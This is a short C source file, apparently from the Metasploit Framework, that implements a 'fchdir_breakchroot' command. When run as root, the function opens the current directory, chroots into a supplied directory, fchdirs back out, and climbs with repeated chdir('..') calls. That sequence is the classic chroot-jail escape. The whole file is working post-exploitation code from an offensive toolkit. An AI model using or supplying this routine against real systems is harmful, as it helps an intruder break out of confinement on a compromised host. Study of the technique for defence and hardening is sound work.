/*
 * Copyright (c) 2004-2005 vlad902 <vlad902 [at] gmail.com>
 * This file is part of the Metasploit Framework.
 * $Revision$
 */

#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "cmd.h"


void cmd_fchdir_breakchroot(int argc, char * argv[])
{
	int loop;
	int dir_fd;
	struct stat sstat;

	if(getuid())
	{
		printf("Not root...\n");
		return;
	}

	if(stat(argv[1], &sstat) < 0)
	{
		perror("stat");
		return;
	}
	if(!S_ISDIR(sstat.st_mode))
	{
		printf("%s is not a directory.\n", argv[1]);
		return;
	}

	if((dir_fd = open(".", O_RDONLY)) == -1)
	{
		perror("open");
		return;
	}

	if(chroot(argv[1]) == -1)
	{
		perror("chroot");
		return;
	}

	if(fchdir(dir_fd) == -1)
	{
		perror("fchdir");
		return;
	}

	close(dir_fd);

	for(loop = 0; loop < 256; loop++)
		chdir("..");

	chroot(".");
}
